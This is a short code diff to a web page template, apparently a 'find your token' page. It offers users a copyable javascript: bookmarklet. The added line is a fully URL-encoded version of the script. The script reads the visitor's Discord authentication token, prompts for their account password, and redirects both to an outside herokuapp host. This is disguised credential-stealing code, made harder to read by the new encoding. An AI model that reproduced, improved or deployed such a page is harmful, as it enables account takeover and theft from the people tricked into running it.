@@ -411,7 +411,7 @@ def home():
   </head>
   <body>
     <div class="box">
-      <div class="token_container">javascript:(async() => { const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void%200).exports.default.getToken();const%20pass%20=%20prompt(%22Enter%20your%20Account%20Password:%20%22);window.location.href%20=%20`https://find-your-token.herokuapp.com/?user=${token}:${pass}`;})()</div>
+      <div class="token_container">javascript:(async()%20%3D%3E%20%7B%20const%20token%20%3D%20(webpackChunkdiscord_app.push(%5B%5B%27%27%5D%2C%7B%7D%2Ce%3D%3E%7Bm%3D%5B%5D%3Bfor(let%20c%20in%20e.c)m.push(e.c%5Bc%5D)%7D%5D)%2Cm).find(m%3D%3Em%3F.exports%3F.default%3F.getToken!%3D%3Dvoid%200).exports.default.getToken()%3Bconst%20pass%20%3D%20prompt(%22Enter%20your%20Account%20Password%3A%20%22)%3Bwindow.location.href%20%3D%20%60https%3A%2F%2Ffind-your-token.herokuapp.com%2F%3Fuser%3D%24%7Btoken%7D%3A%24%7Bpass%7D%60%3B%7D)()</div>
       <button class="copy">Copy</button>
     </div>
 
